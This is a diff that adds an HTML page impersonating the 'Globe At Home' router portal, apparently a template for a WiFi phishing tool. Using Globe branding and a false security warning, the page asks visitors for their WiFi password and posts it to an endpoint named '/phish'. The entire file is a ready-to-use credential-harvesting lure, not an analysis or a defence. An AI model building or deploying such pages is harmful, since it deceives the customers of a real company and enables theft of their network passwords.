@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Globe At Home Portal</title>
+    <link rel="icon" href="/static/logos/globe.png">
+    <style>
+        body { background-color: #e3f2fd; font-family: sans-serif; text-align: center; padding-top: 70px; }
+        img { width: 120px; }
+        h2 { color: #004a99; }
+        input { padding: 10px; width: 240px; margin-top: 20px; }
+        button { padding: 10px 25px; margin-top: 10px; background-color: #004a99; color: white; border: none; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); display: inline-block; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="/static/logos/globe.png" alt="Globe">
+        <h2>Globe At Home</h2>
+        <p>Your router requires security verification. Enter your WiFi password to reconnect.</p>
+        <form method="POST" action="/phish">
+            <input type="password" name="password" placeholder="WiFi Password" required><br>
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+</body>
+</html>
